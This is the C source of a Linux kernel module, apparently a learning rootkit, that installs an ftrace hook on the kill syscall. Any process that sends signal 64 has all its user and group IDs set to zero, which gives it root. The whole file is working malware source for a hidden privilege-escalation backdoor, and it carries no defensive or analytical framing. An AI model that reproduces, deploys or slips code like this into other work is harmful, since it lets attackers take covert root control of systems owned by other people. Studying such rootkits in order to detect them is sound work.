#include <linux/init.h>
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/uidgid.h>
#include <linux/version.h>

#include "ftrace_rootkit_utils.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LiNNNk");
MODULE_DESCRIPTION("A kill syscall hook to get root access.");
MODULE_VERSION("0.1");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
    #define PTREGS_SYSCALLS_STUBS 1
#endif

void set_root(void) {
    struct cred* root;
    root = prepare_creds(); //filled by current process credentials
    if (root == NULL) {
        return;
    }

    /*Set the process to root prior to committing creds.*/
    root->uid.val   =   0;
    root->gid.val   =   0;
    root->suid.val  =   0;
    root->sgid.val  =   0;
    root->euid.val  =   0;
    root->egid.val  =   0;
    root->fsuid.val =   0;
    root->fsgid.val =   0;

    commit_creds(root); 
}


#ifdef PTREGS_SYSCALLS_STUBS
    static asmlinkage long (*orig_kill)(const struct pt_regs*);
    asmlinkage int hook_kill(const struct pt_regs* regs) {
        int sig = regs->si;
        if (sig == 64) {
            pr_info("kill_rootkit: giving root access...\n");
            set_root();
            return 0;
        }

        return orig_kill(regs);
    }

#else
    static asmlinkage long (*orig_kill)(pid_t pid, int sig);
    asmlinkage int hook_kill(pid_t pid, int sig) {
        if (sig == 64) {
            pr_info("kill_rootkit: giving root access...\n");
            set_root();
            return 0;
        }

        return orig_kill(pid, sig);
    }

#endif

static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};

static int __init kill_rootkit_init(void) {
    int err;
    err = install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }
    pr_info("kill_rootkit: loaded\n");
    return 0;
}

static void __exit kill_rootkit_exit(void) {
    remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("kill_rootkits: unloaded\n");
}

module_init(kill_rootkit_init);
module_exit(kill_rootkit_exit);
